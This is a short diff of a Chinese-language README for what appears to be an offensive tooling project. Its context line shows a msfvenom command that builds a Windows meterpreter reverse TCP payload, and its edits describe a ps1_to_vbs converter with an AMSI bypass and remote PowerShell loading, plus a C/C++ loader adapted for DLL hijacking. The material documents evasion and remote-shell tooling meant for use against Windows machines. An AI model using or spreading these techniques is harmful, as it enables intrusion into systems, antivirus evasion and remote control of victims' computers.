@@ -150,7 +150,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f 
 
 
 
-在ps1_to_vbs我添加了bypass AMSI的效果，因此您只需要将powershell上传到网页上即可
+在ps1_to_vbs我添加了bypass AMSI的效果并且采用远程加载powershell，因此您只需要将powershell上传到网页上即可
 
 ## 0x05.自动化生成代理DLL
 
@@ -160,7 +160,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f 
 
 
 
-这里使用了C/C++的loader，只是添加了DllMain(),如果您熟悉Dll hijacking技术就可以愉快地使用它了，但是现在
+这里使用了C/C++的loader，只是添加了DllMain(),如果您熟悉Dll hijacking技术就可以愉快地使用它了
 
 
 
